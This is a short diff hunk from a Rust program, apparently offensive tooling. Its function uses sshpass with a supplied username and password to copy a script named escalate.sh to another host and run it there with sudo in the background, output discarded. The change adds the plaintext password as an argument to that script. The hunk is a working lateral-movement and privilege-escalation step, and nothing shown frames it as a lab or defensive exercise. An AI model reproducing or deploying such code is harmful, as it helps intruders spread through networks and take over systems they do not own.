@@ -37,8 +37,8 @@ fn run_ssh_commands(user: &str, pass: &str, otherip: &str, escalateFileContents:
         return;
     }
 
-    let ssh_command = format!("sshpass -p '{}' scp escalate.sh {}@{}:~/ && sshpass -p '{}' ssh {}@{} 'chmod +x ~/escalate.sh && nohup sudo ~/escalate.sh >/dev/null 2>&1 &'",
-                              pass, user, otherip, pass, user, otherip);
+    let ssh_command = format!("sshpass -p '{}' scp escalate.sh {}@{}:~/ && sshpass -p '{}' ssh {}@{} 'chmod +x ~/escalate.sh && nohup sudo ~/escalate.sh {} >/dev/null 2>&1 &'",
+                              pass, user, otherip, pass, user, otherip, pass);
 
     let output = Command::new("sh")
         .arg("-c")
